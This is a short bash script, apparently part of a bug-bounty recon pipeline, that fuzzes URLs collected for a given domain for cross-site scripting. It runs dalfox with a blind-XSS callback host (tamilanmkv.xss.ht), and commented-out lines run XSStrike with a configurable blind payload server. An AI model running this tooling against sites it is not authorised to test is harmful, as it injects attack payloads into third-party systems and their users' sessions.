#!/bin/bash

domain=$1;
XSS_SERVER="$2"
tools=~/tools
if [[ ! -d "xss" ]]; then
	mkdir xss
	mkdir xss/.tmp
fi
#cat gf/${domain}_xss.txt | qsreplace FUZZ | Gxss -c 100 -p Xss | anew -q xss/.tmp/${domain}_xss_reflected.txt
#if [[ -n "$XSS_SERVER" ]]; then
#	sed -i "s/^blindPayload = \x27\x27/blindPayload = \x27${XSS_SERVER}\x27/" $tools/XSStrike/core/config.py;
#	eval python3 $tools/XSStrike/xsstrike.py --seeds xss/.tmp/${domain}_xss_reflected.txt -t 30 --crawl --blind --skip >> ${domain}_xss.txt
#else
#	eval python3 $tools/XSStrike/xsstrike.py --seeds xss/.tmp/${domain}_xss_reflected.txt -t 30 --crawl --skip >> ${domain}_xss.txt;
#fi
if [[ -f "gf/${domain}_xss.txt" ]]; then
		dalfox -b tamilanmkv.xss.ht --ignore-return 302,403,404 file gf/${domain}_xss.txt -o xss.txt;
fi
